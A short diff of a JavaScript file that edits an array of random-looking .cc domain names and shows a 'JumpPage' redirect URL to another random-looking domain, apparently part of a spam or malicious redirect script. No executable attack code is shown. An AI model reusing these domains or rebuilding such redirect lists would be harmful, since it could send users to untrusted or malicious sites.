@@ -38,8 +38,8 @@ var emails = [
 
 var urls=[
 	'ttohmtjog.cc/', 
-	'hgolqwecs.cc/', 
-    'enzhremt.cc/',
+	'ttohmtjog.cc/', 
+    'hgolqwecs.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://atjxcwxet.com";
